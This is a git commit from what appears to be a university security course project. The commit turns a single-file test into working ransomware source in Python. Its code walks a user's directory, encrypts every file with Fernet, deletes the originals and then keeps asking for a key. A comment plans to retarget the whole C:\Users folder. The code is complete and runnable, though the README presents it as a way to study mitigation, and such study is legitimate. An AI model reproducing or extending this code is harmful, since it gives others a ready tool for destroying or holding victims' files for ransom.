ebd3af45a87aa8ca9d6d1cfd84ac8952dd5917d0
apetron <apetron@oakland.edu>
2022-11-28 16:26:41 -0500

    Updated to loop through all subfolders

--- README.txt
+++ README.txt
@@ -1,1 +1,3 @@
-Placeholder file, can delete once we upload some code.
+Group 6's final project for the Fall 2022 CSI-4480 class at Oakland University.
+
+The project is to make a ransomware program to better understand how they work and how to mitigate their effects.
--- ransomware.py
+++ ransomware.py
@@ -1,6 +1,7 @@
 from cryptography.fernet import Fernet, InvalidToken
 import base64
 import os
+import sys
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -17,53 +18,89 @@ from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 #)
 #key = base64.urlsafe_b64encode(kdf.derive(password))  # Can only use kdf once
 
+#Reads the key from the key.key file if it exists, otherwise generates a new key and writes it to the key.key file
 def generateKey():
-    key = Fernet.generate_key()
-    #Instead of writing to a file, would send to our database if we wanted to go that far
-    file = open('key.key', 'wb')
-    file.write(key)
-    file.close
-    return key
+    if(os.path.exists('key.key')):
+        file = open('key.key', 'rb')
+        key = file.read()
+        file.close()
+        return key
+    else:
+        key = Fernet.generate_key()
+        #Instead of writing to a file, would send to our database if we wanted to go that far
+        file = open('key.key', 'wb')
+        file.write(key)
+        file.close()
+        return key
+
+def encryptFiles(key):
+    #Will set the path in os.walk to be C:\Users\{user} in the final version of the script
+    for root, dirs, files in os.walk("C:\\Users\\{user}\\encrypt_test".format(user=os.getlogin())):
+        for file in files:
+            if(not (file == "key.key" or file == "ransomware.py" or ".encrypted" in file)):
+                print(file)
+                encryptFile(root + "\\" + file, key)
 
 def encryptFile(filePath, key):
-    with open(filePath, 'rb') as f:
-        data = f.read()
-
-    fernet = Fernet(key)
-    encrypted = fernet.encrypt(data)
-    outputFile = filePath + '.encrypted'
-
-    with open(outputFile, 'wb') as f:
-        f.write(encrypted)
-
-    os.remove(filePath)
-    return outputFile
-
-def decryptFile(filePath, key):
-    output_file = filePath.replace('.encrypted', '')
-
-    with open(filePath, 'rb') as f:
-        data = f.read()
-
-    fernet = Fernet(key)
     try:
-        decrypted = fernet.decrypt(data)
+        with open(filePath, 'rb') as f:
+            data = f.read()
 
-        with open(output_file, 'wb') as f:
-            f.write(decrypted)
+        fernet = Fernet(key)
+        encrypted = fernet.encrypt(data)
+        outputFile = filePath + '.encrypted'
+
+        with open(outputFile, 'wb') as f:
+            f.write(encrypted)
 
         os.remove(filePath)
-        return True
-    except InvalidToken as e:
-        print("Invalid Key - Unsuccessfully decrypted")
-        return False
+    except Exception as e:
+        print(e)
 
+#Returns True if the given key successfully decrypts at least one file, False if not
+def decryptFiles(key):
+    decryptedFile = False
+    #Will set the path in os.walk to be C:\Users\{user} in the final version of the script
+    for root, dirs, files in os.walk("C:\\Users\\{user}\\encrypt_test".format(user=os.getlogin())):
+        for file in files:
+            print(file)
+            decryptedFile = decryptFile(root + "\\" + file, key) or decryptedFile
+    return decryptedFile
+
+#Returns True if the file at the given filePath is successfully decrypted, False if not
+def decryptFile(filePath, key):
+    try:
+        with open(filePath, 'rb') as f:
+            data = f.read()
+        
+        outputFile = filePath.replace('.encrypted', '')
+        fernet = Fernet(key)
+
+        try:
+            decrypted = fernet.decrypt(data)
+
+            with open(outputFile, 'wb') as f:
+                f.write(decrypted)
+
+            #Remove the old encrypted file
+            if(".encrypted" in filePath):
+                os.remove(filePath)
+
+            return True
+        except InvalidToken as e:
+            return False
+    except Exception as e:
+        return False
+    
 
 key = generateKey()
-encryptedFile = encryptFile("test.txt", key)
+encryptFiles(key)
+
+#Continue prompting the user for a key until the correct key is entered
 needKey = True
 while(needKey):
     newKey = input("Enter key: ")
-    needKey = not decryptFile(encryptedFile, newKey)
-print("Successfully decrypted file")
+    needKey = not decryptFiles(newKey)
+
+print("Successfully decrypted files")
 
